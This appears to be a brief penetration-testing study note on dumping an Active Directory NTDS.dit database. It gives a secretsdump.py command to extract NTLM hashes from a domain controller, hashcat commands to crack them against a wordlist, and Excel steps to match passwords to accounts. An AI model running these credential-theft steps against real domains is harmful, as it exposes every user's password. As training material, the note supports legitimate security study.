## Dumping the NTDS.dit

### What is it?
- A database used to store AD data
- Data includes:
  - User information
  - Group information
  - Security descriptors
  - Password hashes

### Attack
- Dump it :`secretsdump.py <domain>/<username>:'<password'>@<DC IP> -just-dc-ntlm`

  ![image](https://github.com/user-attachments/assets/a995fd42-13fc-465c-a9ae-197aad4bd5f3)

### Crack Hashes
- Copy the secrets
- Past into Excel
- Use text to columns with colon delimiter
- Delete middle 2 columns
- Copy the hashes
- Paste into file using mousepad
- Crack the hashes `hashcat -m 1000 ntds.txt /usr/share/wordlists/rockyou.txt`
- Show the password `hashcat -m 1000 ntds.txt /usr/share/wordlists/rockyou.txt -- show`

  ![image](https://github.com/user-attachments/assets/2126b459-7af8-4412-9aa3-5f9dec99be31)

- Paste passwords into 2nd Excel sheet
- Use `=vlookup(B1,Sheet2!A:B,2,false)` to match up passwords
- Double click plus to do the rest
- Paste as values
- Make sure number format is text
